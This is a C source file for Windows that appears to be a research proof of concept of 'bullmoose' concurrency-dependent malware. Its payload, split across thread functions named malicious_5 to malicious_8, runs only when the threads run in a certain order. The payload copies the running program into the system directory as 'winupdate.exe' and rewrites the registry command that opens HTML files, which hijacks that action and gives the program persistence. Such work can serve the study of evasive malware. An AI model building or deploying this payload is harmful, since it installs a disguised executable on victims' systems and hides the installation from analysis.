#define WIN32_LEAN_AND_MEAN
#include <pthread.h>
// #include <shellapi.h>
#include <stdio.h>
#include <windows.h>

#include "bullmoose.h"

#ifndef BULLMOOSE_CPP
#define BULLMOOSE_CPP

#define MALICIOUS_CODE 1

static long LOOPS = 120000;
static int sequence[100];
int sequenceOrder;
unsigned int unorder = 0;
unsigned int order = 0;
pthread_mutex_t mutex;
int what;

void recordMessage() {
  int i;
  printf("%d\n", what);
  if (order == 4) {
    printf("1\n");
  } else {
    printf("0\n");
  }
  for (i = 0; sequence[i] != 0; i++) {
    printf("%d, ", sequence[i]);
  }
}

void malicious_start() {

  // OUTPUT_FILENAME = f;
  // LOOPS = atol(argv[4]);
  int i;
  for (i = 0; i < 100; i++) {
    sequence[i] = 0;
  }
  sequenceOrder = 0;
  pthread_mutex_init(&mutex, NULL);
  what = 0;
}

void malicious_end() { recordMessage(); }

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 1;
  if ((1 - unorder) == 1) {
    unorder = 1;
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_2() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 2;
  if ((2 - unorder) == 1) {
    unorder = 2;
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_3() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 3;
  if ((3 - unorder) == 1) {
    unorder = 3;
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_4() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 4;
  if ((4 - unorder) == 1) {
    unorder = 4;
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_5() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 1;
  if (((1 - order) == 1) && unorder != 4) {
    order = 1;
#if MALICIOUS_CODE
    GetModuleFileName(NULL, MyPath, sizeof(MyPath));
    GetSystemDirectory(CpyPath, sizeof(CpyPath));
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_6() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 2;
  if (((2 - order) == 1) && unorder != 4) {
    order = 2;
#if MALICIOUS_CODE
    strcat(CpyPath, "\\winupdate.exe");
    strcat(CpyPath, " %1");
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_7() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 3;
  if (((3 - order) == 1) && unorder != 4) {
    order = 3;
#if MALICIOUS_CODE
    RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0,
                 KEY_WRITE, &Key32);
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_8() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 4;
  if (((4 - order) == 1) && unorder != 4) {
    order = 4;
#if MALICIOUS_CODE
    CopyFile(MyPath, CpyPath, FALSE);
    RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
    RegCloseKey(Key32);
#endif
  }
  pthread_mutex_unlock(&mutex);
}

#endif // BULLMOOSE_CPP